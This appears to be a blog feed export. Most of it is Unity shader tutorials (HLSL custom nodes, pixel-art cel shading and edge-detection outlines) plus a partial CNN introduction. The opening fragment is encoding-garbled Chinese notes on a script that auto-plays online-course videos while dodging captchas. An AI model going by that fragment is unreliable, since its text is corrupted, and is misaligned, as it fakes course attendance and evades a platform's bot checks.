ä¸€ä¸‹ï¼‰ï¼Œè§‚å¯Ÿç›®å½•ç±»ï¼Œå‘ç°å…¶<code>id</code>ä¸­ä¸å«<code>cur</code>ï¼Œå¯ä»¥ä»¥æ­¤å’Œè§†é¢‘é€‰å¡åŒºåˆ†å¼€æ¥</li><li>åœ¨æŸäº›ç½‘è¯¾ä¸­ï¼Œè¿˜å­˜åœ¨é™¤äº†ç›®å½•ç±»ä¹‹å¤–çš„äºŒçº§ç›®å½•ï¼Œè¿™äº›é€‰å¡é‡Œé¢æ²¡æœ‰éœ€è¦åˆ·çš„ç‚¹ï¼Œä¹Ÿæ²¡æœ‰è§†é¢‘ä¹‹ç±»çš„ï¼Œç‚¹å¼€å°±æ˜¯ä¸€ä¸ªç©ºç™½é¡µï¼Œè€Œä¸”<code>id</code>ä¸­è¿˜å¸¦æœ‰<code>cur</code>ï¼Œæ‡’å¾—æƒ³åŠæ³•ï¼Œç›´æ¥ç”¨é»‘åå•ï¼Œæ¯æ¬¡æ‰‹åŠ¨è®¾ç½®ä¸€ä¸‹éœ€è¦è·³è¿‡çš„é€‰å¡å³å¯</li></ul></li><li><p><code>Line75</code>ï¼šä¸€æ—¦æ“ä½œè¿‡äºé¢‘ç¹å°±ä¼šå¼¹å‡ºéªŒè¯ç ï¼Œæ‰€ä»¥<code>SetInterval</code>é—´éš”ç¨å¾®å¤§ä¸€äº›</p></li><li><p>å…³äºå€é€Ÿè®¾ç½®ï¼Œå¦‚æœç›´æ¥è·å–html5æ’­æ”¾å™¨ç„¶åè®¾ç½®<code>playbackRate</code>ä¼šå¯¼è‡´è·³éªŒè¯ç ä»¥åŠè®¾ç½®ä¸ä¸Šï¼Œæ­£å¸¸é€Ÿåº¦æŒ‚ç½‘è¯¾å¯¹æˆ‘æ¥è¯´ä¹Ÿè¶³å¤Ÿäº†ï¼Œæ‡’å¾—å¼„äº†å°±</p></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> è¯¾å†… </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HLSL Note</title>
      <link href="2022/08/12/HLSL-Note/"/>
      <url>2022/08/12/HLSL-Note/</url>
      
        <content type="html"><![CDATA[<p>A post to record HLSL stuff related to unity shader graph programing.</p><span id="more"></span><h1 id="HLSL-Note"><a href="#HLSL-Note" class="headerlink" title="HLSL Note"></a>HLSL Note</h1><h2 id="Custom-Function-Node"><a href="#Custom-Function-Node" class="headerlink" title="Custom Function Node"></a>Custom Function Node</h2><p>When coding the HLSL include file, I found the custom function node in the shader graph never stops throwing out errors that I canâ€™t understand like this:</p><p><img src="/images/HLSLNote_CustomFuctionError.png"></p><p>Any programmer can never allow any red or yellow stuff in his code, so I tried really hard to locate the error, but find nothing useful at the end. Thereâ€™s little information about how I can get rid of this error, until I accidently folded the preview in the node by referring an unsolved post on unity forum questioning that â€œwhy is my custom function node keeps throwing out errors though <strong>THE OVERALL SHADER IS WORKING FINE</strong> ?â€ and the error disappears. My feeling was so mixed and in chaos at that moment.</p><p>It seems that you cannot call functions or use structs in URP Library directly, thatâ€™s why <code>SHADERGRAPH_PREVIEW</code> is defined when node tries to draw preview image.</p><p>Referring some other shader graph custom functions like the one below, we can see that they hard code the variables that should use functions in URP Library to get (such as <code>GetMainLight()</code>) to get a preview from the node (maybe also for performance in node preview).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void MainLight_float(float3 WorldPos, out float3 Direction, out float3 Color, out float DistanceAtten, out float ShadowAtten)</span><br><span class="line">&#123;</span><br><span class="line">    #if SHADERGRAPH_PREVIEW</span><br><span class="line">        Direction &#x3D; float3(-0.5, 0.5, 0);</span><br><span class="line">        Color &#x3D; float3(1, 0.95, 0.8);</span><br><span class="line">        DistanceAtten &#x3D; 1;</span><br><span class="line">        ShadowAtten &#x3D; 1;</span><br><span class="line">    #else</span><br><span class="line">        #if SHADOWS_SCREEN</span><br><span class="line">            float4 clipPos &#x3D; TransformWorldToHClip(WorldPos);</span><br><span class="line">            float4 shadowCoord &#x3D; ComputeScreenPos(clipPos);</span><br><span class="line">        #else</span><br><span class="line">            float4 shadowCoord &#x3D; TransformWorldToShadowCoord(WorldPos);</span><br><span class="line">        #endif</span><br><span class="line">        Light mainLight &#x3D; GetMainLight(shadowCoord);</span><br><span class="line">        Direction &#x3D; mainLight.direction;</span><br><span class="line">        Color &#x3D; mainLight.color;</span><br><span class="line">        DistanceAtten &#x3D; mainLight.distanceAttenuation;</span><br><span class="line">        ShadowAtten &#x3D; mainLight.shadowAttenuation;</span><br><span class="line">    #endif</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>However, the final preview (usually at right bottom corner) is not the same as the preview in nodes, so when you see errors from your custom node, check the final preview out to see whether your code actually works.</p><p>In case you didnâ€™t notice, the function name in the custom function node should be the same as the name in your HLSL file. For example, if you put the code above to the node, you should type in <code>MainLight</code> in the function name input box. The <code>_float</code> after the function name is describing the precision of your data, itâ€™s either <code>_float</code> or <code>_half</code> in shader graph, and you should also change the precision select box in the graph setting to match your precision in the function.</p><h2 id="Static-Variable"><a href="#Static-Variable" class="headerlink" title="Static Variable"></a>Static Variable</h2><p>When I was coding the outline HLSL file, I declared a float parameter outside the main function without marking it <code>static</code>. In HLSL, if you use the variable out of function without marking it static, then:</p><p><img src="/images/HLSLNote_Static.png"></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/direct3dhlsl/dx-graphics-hlsl-variable-syntax">Official document</a> is good, but sometimes I just donâ€™t know if itâ€™s a feature of the language or a bug.</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Unity Pixelated Art Style In URP</title>
      <link href="2022/08/02/UnityPixelatedArtStyleInURP/"/>
      <url>2022/08/02/UnityPixelatedArtStyleInURP/</url>
      
        <content type="html"><![CDATA[<p>Iâ€™m considering diving into game dev for a rather long period from now on, and was managing to find a possible way to build a traditional RPG that can be handled only by myself from any aspect such as assets like models, animation, sound design, and system. I think I should write down my progress and tech details in the future, so that I can feel the speed of my progress and share my experience to help those who are struggling like I was.</p><img height="333" width="515" src="/images/Unity_Pixelated_Art_Style_Final.png" ><span id="more"></span><h1 id="Unity-Pixelated-Art-Style-In-URP"><a href="#Unity-Pixelated-Art-Style-In-URP" class="headerlink" title="Unity Pixelated Art Style In URP"></a>Unity Pixelated Art Style In URP</h1><p>Currently Iâ€™m trying to find a suitable and simple art style for this project to work with, and I saw some pixelated 3D art style created by <a href="https://twitter.com/t3ssel8r">@t3ssel8r</a> by coincidence. Though he didnâ€™t offer any tutorial for beginners to work with, <del>however I am not beginner at all,</del> <small>(Nope)</small> I can still get some information from the comments below his video or twitter especially on how he managed all those amazing works.</p><p><img src="/images/Unity_Pixelated_Art_Style_t3ssel8r.png"></p><center><small>@t3ssel8r's recent work</small></center><p>In order to get a harmonious pixelated art style like t3ssel8râ€™s, I tried to do some breakdown to his final result like the one above.</p><ul><li>Cel shading (also called toon shading, which is more familiar to most developers), a necessity since it can reduce the color range, which is quite important for pixel art in its definition.</li><li>Down sampling, but I find his outcome differ from those pixelated style made by down sampling from camera output, because his method keeps pixel moving smoothly in screen rather than making the whole screen low resolution, so I think he may used some custom render pileline, which is still an unknown area for me to conquer. <strong>This part will not be included in this post</strong>, maybe a relevant post later.</li><li>Outliner, also a significant element in most pixel art. In traditional pixel art, the outline should be seamless, and outline should appear in any sharp edges as if itâ€™s some kind of highlights. So seamless outlines drawn by combining depth, normal, and scene color information is desired.</li></ul><h2 id="Cel-Shading"><a href="#Cel-Shading" class="headerlink" title="Cel Shading"></a>Cel Shading</h2><p>I started to work with cel shading first, and found a developer <a href="https://www.youtube.com/c/RobinSeibold">@Robin Seibold</a> uploaded a cel shader graph with great expansibility in this <a href="https://www.youtube.com/watch?v=gw31oF9qITw">video</a> (BTW his video editing is absolutely fabulous). So I copied one from his video (great thanks to Robin) and modified the shader to suit my own needs (just added more borders to the shadow rather than only one border between lit area and unlit area).</p><p>Iâ€™ve also tried to implement gooch shading, but eventually failed to make it support multiple light sources. So Iâ€™d implement this later and put these content in another post if I succeed.</p><p>To follow the tutorial by Robin, I found my URP version so old that doesnâ€™t include some file that the tutorial may use. Mine is only about URP v10.x.x because thatâ€™s already the highest version Unity 2020 can support according to this <a href="https://github.com/Unity-Technologies/Graphics">official GitHub repo</a>. So I upgraded my Unity to the newest LST 2021.3, which supports URP 12.x.x and dynamic additional light shadows, and made my environment as close to the tutorial as possible.</p><h3 id="Outcome"><a href="#Outcome" class="headerlink" title="Outcome"></a>Outcome</h3><p>For a basic cel material like this one I made below:</p><img height="300" width="300" src="/images/Unity_Pixelated_Art_Style_CelMatPreview.png" ><p>It is coded by following <a href="https://www.youtube.com/c/RobinSeibold">@Robin Seibold</a>â€˜s tutorial I mentioned before, and added an effect that create a certain number of shadow edges, which can be done by just tweaking the diffuse stuff.</p><p>I found a <a href="https://sketchfab.com/3d-models/higokumaru-honkai-impact-3rd-0e903387170846f5939adaa0c277b91b">free model</a> of Honkai Impact 3rd on Sketchfab to test out the cel shading:</p><p><img src="/images/Unity_Pixelated_Art_Style_CelTest.png"></p><p>And I think the effect reaches my desire. This model contains too much details which I can never create in limited time. Currently I just care that whether the shadows, rim, specular looks nice after pixelate, which seems not bad at least.</p><h2 id="Seamless-Outline"><a href="#Seamless-Outline" class="headerlink" title="Seamless Outline"></a>Seamless Outline</h2><p>I used to think outline easy and handy, but this time, it takes me 3 or 4 days to get everything nearly right.</p><img height="200" width="200" src="/images/Unity_Pixelated_Art_Style_Outline.png"><p>Outline is not edge case like â€œPixel Perfect Camâ€, so I found quite a lot sources as references:</p><ul><li><a href="https://www.youtube.com/c/RobinSeibold">@Robin Seibold</a> again, he built a clean outline and taught how to write a renderer feature in URP. Although not using his edge detection method nor using renderer feature to generate normal texture, I learnt a lot about renderer feature by following his video.</li><li><a href="https://www.youtube.com/channel/UCEk8HlMSyA-nkZgFDf5kDEQ">@James King</a>, he tried to recreate <a href="https://twitter.com/t3ssel8r">@t3ssel8r</a>â€˜s outline and pixelated art style in his Three JS project and put it on GitHub.</li></ul><p>This <a href="https://omar-shehata.medium.com/how-to-render-outlines-in-webgl-8253c14724f9">article</a> explained how to draw outline with depth texture and normal texture like the following image does (image from that article)</p><p><img src="/images/Unity_Pixelated_Art_Style_DepthNormalProcess.png"></p><p>To get start with edge detection algorithm, we need the references to a few textures first.</p><h3 id="Textures"><a href="#Textures" class="headerlink" title="Textures"></a>Textures</h3><h4 id="Depth-Texture"><a href="#Depth-Texture" class="headerlink" title="Depth Texture"></a>Depth Texture</h4><p>Depth texture is much easier to get than normal texture. In order to make URP render a depth texture, check â€œDepth Textureâ€ in URP Assets. After so, the <code>_CameraDepthTexture</code> should be rendered and can be seen through <code>Frame Debugger</code>. In shader graph, <code>Scene Depth</code> node is also provided to access depth conveniently.</p><p><img src="/images/Unity_Pixelated_Art_Style_URPAsset.png"></p><p>To know more about depth in game, make sure to check this <a href="https://www.cyanilux.com/tutorials/depth/">article</a>.</p><p>Itâ€™s noticeable that in orthographic cam, raw depth is already linear01, so you shouldnâ€™t use <code>linear01</code> mode nor <code>eye</code> mode in shader graph when using depth node.</p><h4 id="Normal-Texture"><a href="#Normal-Texture" class="headerlink" title="Normal Texture"></a>Normal Texture</h4><p>Thereâ€™re several ways to get a normal texture:</p><ul><li><code>G-Buffer</code> in deferred rendering</li><li><code>_CameraNormalsTexture</code> requested by <code>ConfigureInput(ScriptableRenderPassInput.Normal)</code></li><li>Draw your own normal texture with <code>ScriptableRendererFeature</code> by overriding material on every objects (another version of replacement shader)</li></ul><p>Itâ€™s worth notice that <code>G-Buffer</code> and <code>_CameraNormalsTexture</code> stores <strong>world normal</strong> since those data are usually used to calculate shading / lighting stuff. Drawing your own texture with <code>ScriptableRendererFeature</code> may give you more customizable result, and of course you can draw view normal directly by using this method. However, since override material / replacement shader will override your original shaders, vertex displacement resulted by vertex shader will not be applied, nor normal map or any stuff to do with your original material. As screenshot shows below, <code>_CameraNormalsTexture</code> and <code>G-Buffer</code> hold details and vertex modifications which <code>ScriptableRendererFeature</code> doesnâ€™t.</p><p><img src="/images/Unity_Pixelated_Art_Style_NormalMap.png"></p><center><small>L: world normal from G-Buffer<br>R: view normal by override material</small></center><h5 id="G-Buffer"><a href="#G-Buffer" class="headerlink" title="G-Buffer"></a>G-Buffer</h5><p>The easiest one is selecting <code>Rendering Path</code> as <code>Deferred</code> in <code>URP renderer data</code>, and set camera depth texture mode to <code>DepthNormal</code> in script.</p><p><img src="/images/Unity_Pixelated_Art_Style_URPRendererData.png"></p><p>Because deferred rendering generate <code>G-Buffer</code>, which is used to save scene info in GPU to assist shading computations. The normal texture of the scene can be read from it. With URP 12, it is stored in <code>_GBuffer2</code>.</p><p><img src="/images/Unity_Pixelated_Art_Style_GBuffer2.png"></p><p>The normal texture in G-Buffer is world normal, and it stores negative values, which means even though some pixels are pitch black visually, it still stores normal information which can be transformed to view normal by matrix.</p><p><img src="/images/Unity_Pixelated_Art_Style_CameraNormal.png"></p><center><small>L: world normal from G-Buffer<br>R: view normal converted</small></center><h5 id="Scriptable-Render-Pass-Input"><a href="#Scriptable-Render-Pass-Input" class="headerlink" title="Scriptable Render Pass Input"></a>Scriptable Render Pass Input</h5><p>World normal texture can be get not only in deferred rendering, but also in forward rendering if you requested in a renderer feature. Only one line of code can do it: <code>ConfigureInput(ScriptableRenderPassInput.Normal);</code></p><p>After adding this renderer feature to the URP renderer data, <code>_CameraNormalsTexture</code> will be rendered just the same as the normal texture in <code>G-Buffer</code>.</p><h5 id="Override-Material"><a href="#Override-Material" class="headerlink" title="Override Material"></a>Override Material</h5><p>In <code>Built-in</code> pipeline, you can use <code>Replacement Shader</code> to render the whole scene in a single material. But you canâ€™t use it to control the camera in URP since this function is not contained in <code>Camera</code> class, instead you can use override material to achieve same result.</p><p>To do so, a basic understanding to renderer feature work flow is required. Here is a <a href="https://zhuanlan.zhihu.com/p/115080701">Chinese reference</a> about it.</p><p>In a word, you may wanna use a view normal material as override material and render your scene into a render texture you created. Iâ€™m not that familiar with these currently, so just some ambiguous guidance below.</p><ul><li><p>To create a render target:</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">readonly</span> RenderTargetHandle normals;</span><br><span class="line">normals.Init(<span class="string">&quot;_SceneViewSpaceNormals&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>A customized <code>RenderTextureDescriptor</code> can offer options like color format, texture size, etc. It contains all the information required to create a render texture.</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copy from cam settings</span></span><br><span class="line">RenderTextureDescriptor normalsTextureDescriptor = cameraTextureDescriptor;</span><br><span class="line"><span class="comment">// Customization</span></span><br><span class="line">normalsTextureDescriptor.colorFormat = RenderTextureFormat.ARGB32;</span><br></pre></td></tr></table></figure></li><li><p>Create a temporary render texture with given parameters, and set it up as a global shader property with nameID. Then redirect render target to the temporary RT, and clear the attachment into the color or depth/stencil values (depending on the format of this attachment)</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd.GetTemporaryRT(normals.id, normalsTextureDescriptor, FilterMode.Bilinear);</span><br><span class="line">ConfigureTarget(normals.Identifier());</span><br><span class="line">ConfigureClear(ClearFlag.All, Color.black);</span><br></pre></td></tr></table></figure></li><li><p>Create drawing settings and set override material</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DrawingSettings drawSettings = CreateDrawingSettings(shaderTagIdList, <span class="keyword">ref</span> renderingData, renderingData.cameraData.defaultOpaqueSortFlags);</span><br><span class="line">drawSettings.overrideMaterial = normalsMaterial;</span><br><span class="line">FilteringSettings filteringSettings = <span class="keyword">new</span> FilteringSettings(RenderQueueRange.opaque, layerMask);</span><br><span class="line">context.DrawRenderers(renderingData.cullResults, <span class="keyword">ref</span> drawSettings, <span class="keyword">ref</span> filteringSettings);</span><br></pre></td></tr></table></figure></li><li><p>Release temporary RT after usage</p>  <figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnCameraCleanup</span>(<span class="params">CommandBuffer cmd</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cmd.ReleaseTemporaryRT(normals.id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="Opaque-Texture"><a href="#Opaque-Texture" class="headerlink" title="Opaque Texture"></a>Opaque Texture</h4><p><code>_CameraOpaqueTexture</code> provides a snapshot of the scene right before URP renders any transparent meshes. In shader graph, <code>SceneColor</code> node would sample this texture as return value.</p><p>By enabling the opaque texture, we can draw outline with reference to the original pixel color. This texture can be also used to create effects like frosted glass, water refraction, or heat waves.</p><p>To enable this texture, check the checkbox under depth texture checkbox in URP asset.</p><h3 id="Edge-Detection"><a href="#Edge-Detection" class="headerlink" title="Edge Detection"></a>Edge Detection</h3><p>After preparations of view normal texture, depth texture, opaque texture, itâ€™s time to do real edge detections with these references.</p><p>Edge detection in game is using basically the same tech in image edge detection. You sample a pixel and its neighbors, comparing their difference. However, since we got both normal and depth textures, itâ€™s possible to achieve more complicated effect by combining them together. <a href="https://www.youtube.com/channel/UCEk8HlMSyA-nkZgFDf5kDEQ">@James King</a> is doing a really nice job on this, and made the outline only one pixel wide, which is a significant factor contributing to the overall appearance of the scene. So Iâ€™d explain his logic and talk about issues I encountered when implementing his method in Unity.</p><h4 id="Depth-Edge"><a href="#Depth-Edge" class="headerlink" title="Depth Edge"></a>Depth Edge</h4><ul><li><p><strong>Preprocess</strong></p><p>As I said before, raw depth in orthographic cam is already linear01, but the issue is that when far plane and near plane are far away from each other, the difference between two depth value in the texture becomes too tiny to work with. After my experimenting, it would be clear and reasonable when <code>far plane - near plane = 20</code>, so I made a multiplier by referencing far plane and near plane to change my depth scale making it reasonable. </p><p>Depth values would be difference depending on the platform:</p><ul><li>Direct3D-like, Reversed Z Buffer : <strong>1</strong> at the near plane, <strong>0</strong> at the far plane</li><li>OpenGL-like, Z Buffer : <strong>0</strong> at the near plane, <strong>1</strong> at the far plane</li></ul><p>This reverse flag is stored in <code>_ProjectionParams.x</code>, it can also be accessed in <code>Camera</code> node in shader graph.</p></li><li><p><strong>Process</strong></p><p>  Now sample a few points around the original pixel, and get the bias by <code>bias = neighbor - center</code>. If using this bias directly, both edges inside the object and outside the object will be drawn, which results in at least 2 pixel wide depth outline. But this can be fixed by clamping bias to [0, 1] or [-1, 0], leaving only one pixel wide outline that either nearer or farther one. After so, use <code>smoothstep</code> to control the visibility of edges with different biases.</p></li></ul><p>Then we are done with it.</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pseudo Code</span></span><br><span class="line"><span class="function"><span class="built_in">float</span> <span class="title">GetDepthStrength</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">float</span> difference = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">float</span> bias <span class="keyword">in</span> depthBiases)</span><br><span class="line">        difference += clamp(bias, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> smoothstep(<span class="number">0.01f</span>, <span class="number">0.02f</span>, difference);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Normal-Edge"><a href="#Normal-Edge" class="headerlink" title="Normal Edge"></a>Normal Edge</h4><ul><li><p><strong>Preprocess</strong></p><p>  If you generate view normal texture by overriding materials, you should remap your view normal material from [-1, 1] to [0, 1] since when rendering to the render texture, negative values will be set to 0. By doing so you wonâ€™t lose any normal information. You can remap it back to [-1, 1] when sampling your view normal texture.</p></li><li><p><strong>Edge Sharpness</strong></p><p>  The sharpness is the easiest one to understand in the following parts. <code>sharpness = 1 - dot (normal, neighborNormal)</code></p></li><li><p><strong>Normal Indicator</strong></p><p>Similar to depth edges, weâ€™d like to get normal biases between itâ€™s neighbors: <code>bias = normal - neighborNormal</code>. Since the bias is a <code>float3</code>, it canâ€™t be simply clamped to cut one side of outline (the normal outline is also 2 pixels wide as shown below)</p><img height="200" width="200" src="/images/Unity_Pixelated_Art_Style_RobinOutlineNormal.png"><p>To make the normal outline also one pixel wide, James declared a direction vector3 (e.g. float3(1, 1, 1)) as parameter and get the dot product of which and normal bias: <code>dot(bias, direction vector)</code>. Since the normal texture is in view space, such dot product can cull edges on faces in opposite direction of the direction parameter.</p><p><img src="/images/Unity_Pixelated_Art_Style_ViewNormal.png"></p><center><small>View Space Normal</small></center><p>This dot product can then be passed in <code>smoothstep</code> to get control of edge strength and cull the undesired edges. For example, if the direction parameter is <code>float3(1, 1, 1)</code>, then only edges on faces towards up-right and pointing out of screen will be drawn.</p></li><li><p><strong>Depth Indicator</strong></p><p>  Applying one pixel outline though, itâ€™s unsurprised to find that normal edges shows up outside the object, and it also draws outlines on concave edges.</p><p>  <img src="/images/Unity_Pixelated_Art_Style_DepthIndicator.png"></p>  <center><small>Even two cubes have no contact<br>The normal texture indeed has difference there<br>And happen to match the requirement of the direction parameter</small></center><p>  <img src="/images/Unity_Pixelated_Art_Style_ConcaveEdge.png"></p>  <center><small>The concave edges in red box are not desired in most pixel art</small></center>    To eliminate these outlines, we can make only the shallower pixel detects the normal edge. So depth bias is required here to calculate the depth indicator. Get the average depth bias of the original pixel, if the value is negative, it means the pixel is farther than its neighbors, which should be culled when detecting normal edges; otherwise it counts.</li></ul><p>So the final normal edge strength can be represented as follows:</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pseudo Code</span></span><br><span class="line"><span class="function"><span class="built_in">float</span> <span class="title">GetNormalStrength</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">float</span> normalIndicator = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (float3 neighborNormal <span class="keyword">in</span> neighborNormals)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">float</span> sharpness = (<span class="number">1</span> - dot(normal, neighborNormal));</span><br><span class="line">        <span class="built_in">float</span> normalIndicator = smoothstep(<span class="number">-0.01f</span>, <span class="number">0.01f</span>, dot(normalBias, directionPara));</span><br><span class="line">        normalIndicator += sharpness * normalIndicator;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">float</span> avgDepthBias = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">float</span> bias <span class="keyword">in</span> depthBiases)</span><br><span class="line">        avgDepthBias += bias;</span><br><span class="line">    avgDepthBias /= neighborPointCount;</span><br><span class="line">    <span class="keyword">return</span> step(<span class="number">0.1f</span>, normalIndicator * clamp(sign(avgDepthBias), <span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Outcome-1"><a href="#Outcome-1" class="headerlink" title="Outcome"></a>Outcome</h4><p>Two parameters to control depth and normal edge strength may be wanted. Usually, our brain would like the outline of an object darker, and the normal edges brighter:</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">float</span> strength =</span><br><span class="line">    depthEdgeStrength &gt; <span class="number">0</span> ?</span><br><span class="line">    (<span class="number">1</span> - _depthStrengthPara * depthEdgeStrength) :</span><br><span class="line">    (<span class="number">1</span> + _normalStrengthPara * normalEdgeStrength);</span><br><span class="line">_color = float3(<span class="number">.5</span>f, <span class="number">.5</span>f, <span class="number">.5</span>f) * strength;</span><br></pre></td></tr></table></figure><p><img src="/images/Unity_Pixelated_Art_Style_FinalOutline.png"></p><p>To add scene color to the outline, I analysed the pros and cons of <code>_color = _texel * strength</code> and <code>_color = pow(_texel, strength)</code>, and found the method below is my favorite.</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_color =</span><br><span class="line">    dei &gt; <span class="number">0</span> ?</span><br><span class="line">    _texel * (<span class="number">1</span> - _depthStrength * dei) :</span><br><span class="line">    pow(_texel, <span class="number">1</span> - _normalStrength * nei);</span><br></pre></td></tr></table></figure><p><img src="/images/Unity_Pixelated_Art_Style_Final.gif"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Convolutional Neural Network</title>
      <link href="2022/06/27/ConvolutionalNeuralNetwork/"/>
      <url>2022/06/27/ConvolutionalNeuralNetwork/</url>
      
        <content type="html"><![CDATA[<p>I roughly learnt CNN recently and was about to code one just like the FCNN I coded before. However this may be too costly to time, so Iâ€™ll use TensorFlow in this case and learn more about TF conveniently.</p><span id="more"></span><!--toc--><h1 id="Convolutional-Neural-Network"><a href="#Convolutional-Neural-Network" class="headerlink" title="Convolutional Neural Network"></a>Convolutional Neural Network</h1><p>(This is my first English blog, and maybe there would be more blogs in EN in the future if Iâ€™d like to practice my writing in English. My English sucks, so feel free to raise issues if any error is found)</p><h2 id="CNN-Introduction"><a href="#CNN-Introduction" class="headerlink" title="CNN Introduction"></a>CNN Introduction</h2><p>Actually the core feature of convolutional neural network is the convolutional layer and maybe pooling layer. But actually pooling layer is usually treated as a part of convolutional layer since it does linear calculations.</p><p>A convolutional layer can be concluded as following image, which was drawn by myself.</p><p><img src="/images/CNN_summary.png"></p><h3 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h3><p>A convolutional layer has two parameter matrices we need to train, which are <code>Filter</code> and <code>Bias</code>. Being different from FC layer, in a convolutional layer, <code>Bias</code> matrix cannot be blended into <code>Filter</code> matrix due to the cross correlation operation.</p><p>Comparing with FC layers, the biggest change in convolutional layers is that convolutional layers take tensors as inputs, keeping the form of tensor from the beginning to the end. On the contrary, in the FCNN, we would usually reshape the input to a vector at first.</p><p>Mathematically, we can treat a FC layer as a special case of convolutional layer, and the convolutional layer is the generalization of the FC layer. To prove this, just making all matrices in convolutional layer one dimension. The following image can explain the conclusion further.</p><p><img src="/images/CNN_CNN2FCNN.png"></p><h3 id="Working-Flow"><a href="#Working-Flow" class="headerlink" title="Working Flow"></a>Working Flow</h3><p>A convolutional layer feeds its input to convolutional kernels. The kernels will do cross correlation operation and add the bias accordingly. At the end, collect all outputs from all kernels and make it a new tensor by just stacking those outputs. The output of a convolutional layer is called feature map.</p><h3 id="Goal"><a href="#Goal" class="headerlink" title="Goal"></a>Goal</h3><p>A convolutional layer has a rather different goal from the FC layer.</p><p>When using FC layers, we are expecting a humanoid brain neuron like model can learn from generic inputs. However, when doing image processing, this particular topic leads to huge amount of trainable parameters in FCNN. In which case, we can do some pre-process to the input image since we can easily see that not every pixel in the input is important for the task, and this pre-process is called convolution. From this aspect, we can treat convolutional layers in the network as feature detectors, the convolutional layers learn to extract meaningful features from the image using the filter and bias tensor, and use pooling layers to compress / emphasis the feature it extracted, making fewer trainable parameters.</p><p>But as I mentioned, convolutional layers are only good at feature extraction. So when doing classification with multiple features, itâ€™s still better to use FC layers. In which case, a CNN usually end up with FC layers to give the final outputs.</p><p>In conclusion, in CNN, the goal of a convolutional layer is extracting features from a rather huge input. The goal of a pooling layer is compressing data without damaging the main features. The goal of a FC layer in the end of CNN is to learn classification by giving features just as normal AI things would do.</p><h3 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h3><p>We can apply CNN in not only image recognition but also other area that shares the basic features with image recognition. For example, go and mahjong playing used CNN a lot. Especially in go playing, we can treat the go board as a 19x19 image with 48 channels (the reason why there should be 48 channels was raised by pros). and we can process 